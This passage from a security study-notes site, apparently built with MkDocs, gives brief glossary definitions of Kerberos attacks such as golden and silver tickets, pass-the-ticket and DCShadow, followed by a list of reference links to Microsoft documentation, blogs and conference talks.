<p>Pass-the-ticket: the process of forging a session key and presenting that forgery to the resource as credentials</p>
<p><a href="https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/">Golden Ticket:</a> A ticket that grants a user domain admin access</p>
<p><a href="https://www.varonis.com/blog/kerberos-attack-silver-ticket/">Silver Ticket:</a> A forged ticket that grants access to a serviceCredential stuffing.</p>
<p>Brute force: automated continued attempts to guess a password</p>
<p>Encryption downgrade with Skeleton Key Malware: A malware that can bypass Kerberos, but the attack must have Admin access</p>
<p>DCShadow attack: a new attack where attackers gain enough access inside a network to set up their own DC to use in further infiltration</p>
<h2 id="reference">Reference:<a class="headerlink" href="#reference" title="Permanent link">&para;</a></h2>
<blockquote>
<ul>
<li><a href="https://docs.microsoft.com/en-us/windows/desktop/secauthn/authentication-portal">https://docs.microsoft.com/en-us/windows/desktop/secauthn/authentication-portal</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/desktop/secauthn/microsoft-kerberos">https://docs.microsoft.com/en-us/windows/desktop/secauthn/microsoft-kerberos</a></li>
<li><a href="https://drive.google.com/open?id=1eaQki6QuqfbHqMfkaKH66z2OAnI0lV0H">https://drive.google.com/open?id=1eaQki6QuqfbHqMfkaKH66z2OAnI0lV0H</a></li>
<li><a href="https://www.tarlogic.com/en/blog/how-kerberos-works/">https://www.tarlogic.com/en/blog/how-kerberos-works/</a></li>
</ul>
<ul>
<li><a href="https://www.youtube.com/watch?v=HHJWfG9b0-E">Tim Medin - Attacking Kerberos: Kicking the Guard Dog of Hades</a></li>
</ul>
</blockquote>
<ul>
<li><a href="https://www.youtube.com/watch?v=PUyhlN-E5MU">Attacking Microsoft Kerberos Kicking the Guard Dog of Hades Tim Medin</a> </li>
<li><a href="https://blog.redforce.io/oh-my-kerberos-do-not-get-kerberoasted/">https://blog.redforce.io/oh-my-kerberos-do-not-get-kerberoasted/</a></li>
<li><a href="https://www.tarlogic.com/en/blog/how-kerberos-works/">https://www.tarlogic.com/en/blog/how-kerberos-works/</a></li>
<li><a href="https://www.tarlogic.com/en/blog/how-to-attack-kerberos/">https://www.tarlogic.com/en/blog/how-to-attack-kerberos/</a></li>
</ul>
                
                  
                
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../jwt/" title="Jwt" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                Jwt
              </span>
            </div>
          </a>
        
        
          <a href="../oauth2-and-oidc/" title="Oauth2 and oidc" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                Oauth2 and oidc
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../assets/javascripts/application.808e90bb.js"></script>
      
      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
      
    
  </body>
</html>